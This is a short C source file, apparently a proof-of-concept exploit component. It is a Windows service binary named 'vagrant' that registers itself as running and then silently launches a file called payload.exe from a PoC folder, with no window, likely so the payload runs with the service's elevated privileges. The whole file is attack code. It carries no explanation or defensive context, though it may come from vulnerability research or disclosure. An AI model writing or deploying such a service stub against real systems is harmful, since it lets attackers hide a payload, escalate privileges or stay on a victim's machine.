#include <windows.h>
#include <winsvc.h>

#define SERVICE_NAME L"vagrant"

SERVICE_STATUS_HANDLE g_hSvc;

VOID WINAPI Handler(DWORD c)
{
    if (c == SERVICE_CONTROL_STOP)
        ExitProcess(0);
}

VOID WINAPI ServiceMain(DWORD dwNumServicesArgs, LPWSTR *lpServiceArgVectors)
{
    g_hSvc = RegisterServiceCtrlHandlerW(SERVICE_NAME, Handler);

    SERVICE_STATUS s = {0};
    s.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    s.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(g_hSvc, &s);

    STARTUPINFOW si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    CreateProcessW(
        L"C:\\Users\\ho4ngphwc\\Desktop\\PoC\\payload.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);

    Sleep(INFINITE);
}

int wmain()
{
    SERVICE_TABLE_ENTRYW t[] = {
        {SERVICE_NAME, ServiceMain},
        {NULL, NULL}};
    StartServiceCtrlDispatcherW(t);
    return 0;
}
